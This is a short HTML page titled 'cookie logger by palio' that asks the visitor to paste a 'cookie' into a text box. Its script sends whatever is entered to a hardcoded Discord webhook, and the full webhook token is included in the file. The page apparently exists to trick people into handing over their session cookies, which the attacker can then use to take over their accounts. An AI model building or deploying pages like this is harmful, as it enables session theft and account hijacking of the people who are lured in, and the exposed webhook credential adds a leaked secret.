<!DOCTYPE html>
<html>
  <head>
    <title>cookie logger by palio</title>
  </head>
  <body>
    <h1>cookie here</h1>
    <form>
      <label for="message">cookie:</label><br>
      <textarea id="message" name="message" rows="4" cols="50"></textarea><br><br>
      <input type="button" value="Send" onclick="sendMessage()">
    </form>
    <script>
      function sendMessage() {
        const message = document.getElementById("message").value;
        const webhookUrl = "https://discordapp.com/api/webhooks/1080433346192101407/sbGCNg3A8jeryS0LswMK_pQGloxVHCRRdBw0ptZlI7K3b49innAVm6baHEQCmX-yFy9a";
        const payload = {
          content: message
        };
        fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        })
        .then(response => console.log(response))
        .catch(error => console.error(error));
      }
    </script>
  </body>
</html>
